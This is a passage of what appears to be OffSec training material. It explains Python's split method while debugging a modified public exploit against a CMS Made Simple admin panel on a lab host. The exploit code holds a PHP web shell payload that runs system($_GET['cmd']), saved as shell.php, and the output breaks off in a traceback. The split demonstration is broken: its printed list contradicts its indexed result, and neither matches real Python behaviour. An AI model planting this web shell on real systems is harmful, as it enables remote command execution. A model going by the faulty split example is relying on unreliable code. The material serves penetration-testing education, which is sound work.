# OffSec

first argument. The string slices returned by split are then stored in a Python list object that can be accessed via an index.

```
kali@kali:~$ python
...
>>> mystr = "Kali-*-Linux-*-Rocks"

>>> result = mystr.split("-")

>>> result
['Kali', 'Rocks']

>>> result[1]
'Linux'
```

Listing 342 - Python string split method

In our exploit code, the string separator is defined as the csrf_param ("__c") followed by an equals sign.

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

Listing 343 - Understanding the code on line 24

In order to better understand the IndexError, we can add a print statement in the parse_csrf_token function before return:

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    print("[+] String that is being split: " + location)
    return location.split(csrf_param + "=")[1]
```

Listing 344 - Adding a print statement to see where the method is invoked on

The exploit shows how the split method is invoked before split:

```
kali@kali:~$ python 44976_modified.py
/usr/lib/python2/dist-packages/urllib3/connection.py:849
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is wisely advised. See https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split:
https://10.11.0.128/admin?csrf=f29464ad9afec247886
Traceback (most recent call last):
File "44976_modified.py", line 104, in <module>
run()
File "44976_modified.py", line 95, in run
```